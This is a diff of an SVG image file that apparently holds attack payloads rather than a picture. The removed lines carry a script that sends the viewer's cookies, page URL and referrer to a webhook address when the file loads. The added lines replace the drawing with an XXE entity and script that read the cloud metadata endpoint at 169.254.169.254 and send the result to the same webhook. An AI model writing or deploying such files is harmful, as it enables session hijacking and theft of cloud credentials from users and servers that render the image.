@@ -1,28 +1,14 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" viewBox="0 0 16 16" width="800px" height="800px">
-  <script type="text/javascript">
+<!DOCTYPE svg [
+  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="800px" height="800px">
+  <script>
     <![CDATA[
-      fetch('https://webhook.site/678717ea-2069-483b-896c-b475ffe7bac5', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          'info': 'SVG loaded',
-          'time': new Date().toISOString(),
-          'url': window.location.href,
-          'userAgent': navigator.userAgent,
-          'cookies': document.cookie,
-          'referrer': document.referrer
-        })
-      });
-      
-      // Опционально: показать alert
-      // alert('Hacked!');
+      fetch('http://169.254.169.254/latest/meta-data/')
+        .then(r => r.text())
+        .then(data => fetch('https://webhook.site/678717ea-2069-483b-896c-b475ffe7bac5?data=' + encodeURIComponent(data)))
     ]]>
   </script>
-  
-  <!-- Рисунок инопланетянина из твоего примера -->
-  <path fill-rule="evenodd" clip-rule="evenodd" d="M8 16L3.54223 12.3383C1.93278 11.0162 1 9.04287 1 6.96005C1 3.11612 4.15607 0 8 0C11.8439 0 15 3.11612 15 6.96005C15 9.04287 14.0672 11.0162 12.4578 12.3383L8 16ZM3 6H5C6.10457 6 7 6.89543 7 8V9L3 7.5V6ZM11 6C9.89543 6 9 6.89543 9 8V9L13 7.5V6H11Z" fill="#000000"/>
+  <text x="10" y="20">&ssrf;</text>
 </svg>
